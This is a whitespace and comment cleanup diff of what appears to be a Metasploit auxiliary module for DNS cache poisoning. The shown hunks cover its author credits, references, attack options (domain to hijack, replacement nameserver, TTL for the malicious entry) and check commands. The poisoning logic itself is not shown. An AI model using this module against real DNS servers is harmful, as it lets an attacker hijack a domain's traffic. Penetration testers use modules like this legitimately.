@@ -33,11 +33,10 @@ class Metasploit3 < Msf::Auxiliary
 			},
 			'Author'         =>
 				[
-				'	I)ruid', 'hdm',
-					                                      #
-					'Cedric Blancher <sid[at]rstack.org>' # Cedric figured out the NS injection method
-					                                      # and was cool enough to email us and share!
-					                                      #
+					'I)ruid', 'hdm',
+					# Cedric figured out the NS injection method
+					# and was cool enough to email us and share!
+					'Cedric Blancher <sid[at]rstack.org>'
 				],
 			'License'        => MSF_LICENSE,
 			'Version'        => '$Revision$',
@@ -49,27 +48,27 @@ class Metasploit3 < Msf::Auxiliary
 					[ 'URL', 'http://www.caughq.org/exploits/CAU-EX-2008-0003.txt' ],
 				],
 			'DisclosureDate' => 'Jul 21 2008'
-			))
+		))
 
-			register_options(
-				[
-					OptEnum.new('SRCADDR', [true, 'The source address to use for sending the queries', 'Real', ['Real', 'Random'], 'Real']),
-					OptPort.new('SRCPORT', [true, "The target server's source query port (0 for automatic)", nil]),
-					OptString.new('DOMAIN', [true, 'The domain to hijack', 'example.com']),
-					OptString.new('NEWDNS', [true, 'The hostname of the replacement DNS server', nil]),
-					OptAddress.new('RECONS', [true, 'The nameserver used for reconnaissance', '208.67.222.222']),
-					OptInt.new('XIDS', [true, 'The number of XIDs to try for each query (0 for automatic)', 0]),
-					OptInt.new('TTL', [true, 'The TTL for the malicious host entry', rand(20000)+30000]),
-				], self.class)
+		register_options(
+			[
+				OptEnum.new('SRCADDR', [true, 'The source address to use for sending the queries', 'Real', ['Real', 'Random'], 'Real']),
+				OptPort.new('SRCPORT', [true, "The target server's source query port (0 for automatic)", nil]),
+				OptString.new('DOMAIN', [true, 'The domain to hijack', 'example.com']),
+				OptString.new('NEWDNS', [true, 'The hostname of the replacement DNS server', nil]),
+				OptAddress.new('RECONS', [true, 'The nameserver used for reconnaissance', '208.67.222.222']),
+				OptInt.new('XIDS', [true, 'The number of XIDs to try for each query (0 for automatic)', 0]),
+				OptInt.new('TTL', [true, 'The TTL for the malicious host entry', rand(20000)+30000]),
+			], self.class)
 
-			deregister_options('FILTER','PCAPFILE')
+		deregister_options('FILTER','PCAPFILE')
 	end
 
 	def auxiliary_commands
 		return {
 			"check" => "Determine if the specified DNS server (RHOST) is vulnerable",
 			"racer" => "Determine the size of the window for the target server"
-		 }
+		}
 	end
 
 	def cmd_racer(*args)
